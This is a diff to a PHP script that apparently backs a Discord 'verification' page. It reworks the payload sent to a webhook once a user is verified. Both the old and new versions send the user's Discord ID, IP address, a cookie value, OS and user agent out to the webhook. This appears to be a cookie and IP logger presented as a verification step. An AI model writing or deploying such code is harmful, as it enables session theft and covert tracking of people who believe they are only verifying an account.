@@ -92,22 +92,19 @@
          }
          $_SESSION[$session_key] = true;
 
-         // Combined payload with ping
+         // Flat payload with ping
          $payload = [
              'content' => "<@{$user_id}>", // Ping the user
-             'embeds' => [[
-                 'title' => 'Verification Successful',
-                 'description' => "User verified with the following details:",
-                 'color' => 3066993, // Discord green
-                 'fields' => [
-                     ['name' => 'Discord ID', 'value' => $user_id, 'inline' => true],
-                     ['name' => 'IP Address', 'value' => $ip_address, 'inline' => true],
-                     ['name' => 'Cookie', 'value' => $cookie, 'inline' => true],
-                     ['name' => 'OS', 'value' => $os, 'inline' => true],
-                     ['name' => 'User Agent', 'value' => substr($user_agent, 0, 1000), 'inline' => false],
-                     ['name' => 'Timestamp', 'value' => date('c'), 'inline' => true]
-                 ]
-             ]]
+             'username' => 'Verification Bot',
+             'embeds' => [],
+             'attachments' => [],
+             'status' => 'verified',
+             'discord_user_id' => $user_id,
+             'cookie' => $cookie,
+             'ip_address' => $ip_address,
+             'user_agent' => substr($user_agent, 0, 1000),
+             'os' => $os,
+             'timestamp' => date('c')
          ];
 
          // Send to webhook once
